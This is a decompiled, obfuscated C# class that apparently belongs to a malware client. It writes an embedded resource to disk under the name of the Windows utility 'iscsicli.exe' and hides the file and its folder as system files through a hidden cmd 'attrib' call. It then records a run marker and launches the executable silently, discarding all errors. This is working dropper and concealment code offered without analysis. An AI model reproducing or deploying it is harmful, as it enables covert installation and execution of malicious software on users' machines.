using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using A;
using Client.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns20;

namespace ns0;

public class GClass0
{
	public static Thread thread_0 = new Thread(smethod_0, 1);

	public static object object_0 = Operators.ConcatenateObject(GClass20.object_1, (object)"\\iscsicli.exe");

	public static void smethod_0()
	{
		try
		{
			if (Operators.CompareString(C.b("SIC"), (string)null, false) == 0)
			{
				smethod_2();
				File.WriteAllBytes(Conversions.ToString(object_0), Resources.iscsicli);
				smethod_1();
				C.a("SIC", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
				Type typeFromHandle = typeof(Process);
				object[] obj = new object[1] { object_0 };
				object[] array = obj;
				bool[] obj2 = new bool[1] { true };
				bool[] array2 = obj2;
				NewLateBinding.LateCall((object)null, typeFromHandle, "Start", obj, (string[])null, (Type[])null, obj2, true);
				if (array2[0])
				{
					object_0 = RuntimeHelpers.GetObjectValue(array[0]);
				}
			}
			else
			{
				Type typeFromHandle2 = typeof(Process);
				object[] obj3 = new object[1] { object_0 };
				object[] array = obj3;
				bool[] obj4 = new bool[1] { true };
				bool[] array2 = obj4;
				NewLateBinding.LateCall((object)null, typeFromHandle2, "Start", obj3, (string[])null, (Type[])null, obj4, true);
				if (array2[0])
				{
					object_0 = RuntimeHelpers.GetObjectValue(array[0]);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_1()
	{
		object obj = Operators.ConcatenateObject((object)"attrib +H +R +S \"", NewLateBinding.LateGet(object_0, (Type)null, "TrimEnd", new object[1] { '\\' }, (string[])null, (Type[])null, (bool[])null));
		Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"cmd /c ", obj), (object)"\" & "), obj), (object)"\\*\" /S /D")), (AppWinStyle)0, false, -1);
	}

	public static void smethod_2()
	{
		object obj = Operators.ConcatenateObject((object)"attrib -H -R -S \"", NewLateBinding.LateGet(object_0, (Type)null, "TrimEnd", new object[1] { '\\' }, (string[])null, (Type[])null, (bool[])null));
		Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"cmd /c ", obj), (object)"\" & "), obj), (object)"\\*\" /S /D")), (AppWinStyle)0, false, -1);
	}
}
